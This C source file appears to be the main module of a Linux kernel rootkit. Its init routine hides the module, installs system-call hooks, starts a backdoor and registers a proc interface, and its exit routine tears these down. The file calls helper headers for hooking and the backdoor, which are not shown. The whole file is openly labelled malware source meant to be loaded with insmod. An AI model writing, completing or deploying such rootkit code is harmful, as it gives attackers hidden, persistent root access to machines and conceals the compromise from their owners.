#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <asm/paravirt.h> // write_cr0

#include "config.h"
#include "hooks.h"
#include "backdoor.h"
#include "proc.h"


//insmod
static int lkm_init(void){
	printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
	if (HIDE_MODULE){
		if (hide_module() == -1){
			printk(KERN_INFO "ROOTKIT: INIT ERROR hiding module\n");
			goto err_hide;
		}
	}

	if (hooks_init() == -1){
		printk(KERN_INFO "ROOTKIT: INIT ERROR hooks\n");
		goto err_hooks;
	}

	if (BACKDOOR){
		if (backdoor_init() == -1){
			printk(KERN_INFO "ROOTKIT: INIT ERROR backdoor\n");
			goto err_backdoor;
		}
	}

	if (proc_init() == -1){
		printk(KERN_INFO "ROOTKIT: INIT ERROR proc\n");
		goto err_proc;
	}

	return 0;

	err_proc:
	backdoor_exit();

	err_backdoor:
	hooks_exit();

	err_hooks:
	unhide_module();

	err_hide:
	return -1;
}

//rmmod
static void lkm_exit(void){
	proc_exit();
	if (BACKDOOR) backdoor_exit();
	hooks_exit();
	if (hidden) unhide_module(); //I think lkm_exit won't be executed if the module is hidden
	printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

